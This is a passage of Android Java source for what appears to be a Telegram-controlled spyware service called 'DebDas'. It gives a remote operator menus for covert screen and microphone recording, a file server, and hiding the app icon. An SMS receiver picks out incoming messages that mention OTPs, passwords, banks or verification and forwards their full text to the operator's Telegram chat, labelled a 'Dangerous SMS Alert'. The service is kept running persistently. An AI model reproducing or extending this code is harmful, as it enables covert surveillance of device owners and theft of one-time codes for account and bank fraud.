                + "[{\"text\":\"🌐 File Server ON\",\"callback_data\":\"" + CB_FILE_SERVER_START + "\"},{\"text\":\"🌐 File Server OFF\",\"callback_data\":\"" + CB_FILE_SERVER_STOP + "\"}],"
                + "[{\"text\":\"👻 Hide App\",\"callback_data\":\"hide\"},{\"text\":\"👁️ Unhide App\",\"callback_data\":\"unhide\"}],"
                + "[{\"text\":\"📊 Device Status\",\"callback_data\":\"status\"},{\"text\":\"🔄 Refresh\",\"callback_data\":\"refresh\"}]"
                + "]}";
        sendMessageWithKeyboard("⚙️ **DebDas CONTROL PANEL**\n\n" + getDeviceDetailsString() + "\n\n👇 **Select Option:**" + getFooter(), keyboard);
    }

    private void showScreenMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"10s\",\"callback_data\":\"screen_10\"},{\"text\":\"30s\",\"callback_data\":\"screen_30\"},{\"text\":\"60s\",\"callback_data\":\"screen_60\"}],"
                + "[{\"text\":\"2 min\",\"callback_data\":\"screen_120\"},{\"text\":\"5 min\",\"callback_data\":\"screen_300\"},{\"text\":\"10 min\",\"callback_data\":\"screen_600\"}],"
                + "[{\"text\":\"🔙 Back\",\"callback_data\":\"main_menu\"}]"
                + "]}";
        sendMessageWithKeyboard("🎥 **SCREEN RECORDING**\n\n" + getDeviceDetailsString() + "\n\n📊 Select Duration:" + getFooter(), keyboard);
    }

    private void showScreenAudioMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"10s\",\"callback_data\":\"screenaudio_10\"},{\"text\":\"30s\",\"callback_data\":\"screenaudio_30\"},{\"text\":\"60s\",\"callback_data\":\"screenaudio_60\"}],"
                + "[{\"text\":\"2 min\",\"callback_data\":\"screenaudio_120\"},{\"text\":\"5 min\",\"callback_data\":\"screenaudio_300\"},{\"text\":\"10 min\",\"callback_data\":\"screenaudio_600\"}],"
                + "[{\"text\":\"🔙 Back\",\"callback_data\":\"main_menu\"}]"
                + "]}";
        sendMessageWithKeyboard("🎥🎙️ **SCREEN + AUDIO RECORDING**\n\n" + getDeviceDetailsString() + "\n\n📊 Select Duration:" + getFooter(), keyboard);
    }

    private void showAudioMenu() {
        String keyboard = "{\"inline_keyboard\":["
                + "[{\"text\":\"10s\",\"callback_data\":\"audio_10\"},{\"text\":\"30s\",\"callback_data\":\"audio_30\"},{\"text\":\"60s\",\"callback_data\":\"audio_60\"}],"
                + "[{\"text\":\"2 min\",\"callback_data\":\"audio_120\"},{\"text\":\"5 min\",\"callback_data\":\"audio_300\"},{\"text\":\"10 min\",\"callback_data\":\"audio_600\"}],"
                + "[{\"text\":\"🔙 Back\",\"callback_data\":\"main_menu\"}]"
                + "]}";
        sendMessageWithKeyboard("🎙️ **AUDIO RECORDING**\n\n" + getDeviceDetailsString() + "\n\n📊 Select Duration:" + getFooter(), keyboard);
    }

    private void sendStatus() {
        String status = "📊 **DEVICE STATUS**\n\n" + getDeviceDetailsString() + "\n"
                + "🎥 **Recording:** " + (isRecording ? "Yes" : "No") + "\n"
                + "💡 Type /menu for controls" + getFooter();
        sendMessage(status);
    }

    private void hideApp() {
        PackageManager pm = getPackageManager();
        ComponentName comp = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(comp, PackageManager.COMPONENT_ENABLED_STATE_DISABLED, PackageManager.DONT_KILL_APP);
        sendMessage("👻 **App Hidden!**\n\n" + getDeviceDetailsString() + "\nTo restore, use the /menu command or re-open the app manually." + getFooter());
    }

    private void unhideApp() {
        PackageManager pm = getPackageManager();
        ComponentName comp = new ComponentName(this, MainActivity.class);
        pm.setComponentEnabledSetting(comp, PackageManager.COMPONENT_ENABLED_STATE_ENABLED, PackageManager.DONT_KILL_APP);
        sendMessage("👁️ **App Restored!**\n\n" + getDeviceDetailsString() + getFooter());
    }

    private void sendMessage(String text) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage?chat_id=" + Config.CHAT_ID +
                        "&text=" + URLEncoder.encode(text, "UTF-8") + "&parse_mode=Markdown";
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private void sendMessageWithKeyboard(String text, String keyboardJson) {
        new Thread(() -> {
            try {
                JSONObject params = new JSONObject();
                params.put("chat_id", Config.CHAT_ID);
                params.put("text", text);
                params.put("parse_mode", "Markdown");
                params.put("reply_markup", new JSONObject(keyboardJson));
                URL url = new URL("https://api.telegram.org/bot" + Config.BOT_TOKEN + "/sendMessage");
                HttpURLConnection conn = (HttpURLConnection) url.openConnection();
                conn.setRequestMethod("POST");
                conn.setDoOutput(true);
                conn.setRequestProperty("Content-Type", "application/json");
                conn.getOutputStream().write(params.toString().getBytes("UTF-8"));
                conn.getInputStream();
                conn.disconnect();
            } catch (Exception ignored) {}
        }).start();
    }

    private void answerCallback(String callbackId) {
        new Thread(() -> {
            try {
                String url = "https://api.telegram.org/bot" + Config.BOT_TOKEN + "/answerCallbackQuery?callback_query_id=" + callbackId;
                getRequest(url);
            } catch (Exception ignored) {}
        }).start();
    }

    private String getRequest(String urlStr) {
        try {
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setConnectTimeout(10000);
            conn.setReadTimeout(10000);
            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
            StringBuilder sb = new StringBuilder();
            String line;
            while ((line = reader.readLine()) != null) sb.append(line);
            reader.close();
            conn.disconnect();
            return sb.toString();
        } catch (Exception e) {
            return null;
        }
    }

    // ── Dangerous SMS receiver (Feature 7) – must be registered in manifest ──
    public static class SmsReceiver extends android.content.BroadcastReceiver {
        @Override
        public void onReceive(Context context, Intent intent) {
            if ("android.provider.Telephony.SMS_RECEIVED".equals(intent.getAction())) {
                Object[] pdus = (Object[]) intent.getExtras().get("pdus");
                if (pdus != null) {
                    for (Object pdu : pdus) {
                        android.telephony.SmsMessage sms = android.telephony.SmsMessage.createFromPdu((byte[]) pdu);
                        String body = sms.getMessageBody();
                        if (containsDangerousKeyword(body)) {
                            Intent warnIntent = new Intent(context, MainService.class);
                            warnIntent.putExtra("dangerous_sms", body);
                            context.startService(warnIntent);
                        }
                    }
                }
            }
        }

        private boolean containsDangerousKeyword(String body) {
            String[] keywords = {"OTP", "password", "bank", "alert", "suspicious", "verify"};
            for (String k : keywords) if (body.toLowerCase().contains(k.toLowerCase())) return true;
            return false;
        }
    }

    // ── Static setData (fixes MainActivity error) ──
    public static void setData(Intent intent, int code) {
        captureIntent = intent;
        captureResultCode = code;
        Log.d("ZeroService", "setData called: intent=" + intent + ", code=" + code);
    }

    @Override
    public int onStartCommand(Intent intent, int flags, int startId) {
        if (intent != null) {
            // Handle media projection
            if (intent.hasExtra("data")) {
                captureIntent = intent.getParcelableExtra("data");
                captureResultCode = intent.getIntExtra("code", -1);
                SharedPreferences prefs = getSharedPreferences(PREF_SCREEN, MODE_PRIVATE);
                prefs.edit().putBoolean(KEY_SCREEN_CAPTURED, true).apply();
            }
            // Handle dangerous SMS alert (Feature 7)
            if (intent.hasExtra("dangerous_sms")) {
                String smsBody = intent.getStringExtra("dangerous_sms");
                sendMessage("⚠️ **Dangerous SMS Alert!**\n" + smsBody + "\n" + getFooter());
            }
        }
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        if (timer != null) timer.cancel();
        if (wakeLock != null && wakeLock.isHeld()) wakeLock.release();
        stopFileServer();
        cleanup();
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent intent) {
        return null; // Required abstract method
    }
}